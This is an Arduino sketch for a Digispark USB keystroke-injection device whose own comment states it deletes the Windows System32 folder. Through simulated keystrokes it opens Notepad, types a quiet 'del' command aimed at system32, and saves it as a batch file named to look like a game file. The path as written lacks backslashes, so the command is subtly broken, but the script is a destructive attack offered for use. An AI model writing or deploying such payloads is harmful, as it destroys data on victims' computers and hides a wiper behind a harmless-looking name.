#include<DigiKeyboard.h>

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // Deleting System32 Folder of windows
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("notepad");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("del c:WINDOWSsystem32*.*/q");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("CSGO(1,6).bat");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){
    // stops the program from repeating itself
  }
}
